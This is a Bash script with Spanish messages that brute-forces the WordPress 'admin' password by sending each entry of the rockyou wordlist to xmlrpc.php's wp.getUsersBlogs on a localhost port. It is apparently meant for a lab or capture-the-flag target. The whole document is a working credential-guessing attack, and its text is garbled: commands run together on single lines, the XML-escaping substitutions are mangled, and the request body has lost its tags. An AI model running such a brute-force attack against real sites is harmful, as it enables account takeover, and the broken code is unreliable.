#!/bin/bash 
function ctrl_c(){ 
    echo -e "\n\n[!] Saliendo...\n" exit 1 
    } 
# Ctrl+C 
trap ctrl_c SIGINT 
function escapeXml() { 
    local data=$1 data=${data//&/&} data=${data///>} data=${data//\"/"} data=${data//\'/'} echo "$data" } 
    
    function createXML() { 
    password=$1 
    if [[ -z $password ]]; 
    then return # Ignorar contraseñas en blanco y continuar con la siguiente línea fi escaped_password=$(escapeXml "$password") xmlFile=$(cat <<EOF wp.getUsersBlogs admin EOF )
    
    echo "$xmlFile" > file.xml 
    
    response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml) 
    
    if [[ ! $response =~ "Incorrect username or password." ]]; 
    then echo "Contraseña encontrada para el usuario dado: $password" exit 0 fi } awk 'NF > 0' /usr/share/wordlists/rockyou.txt | while IFS= read -r password; do createXML "$password" done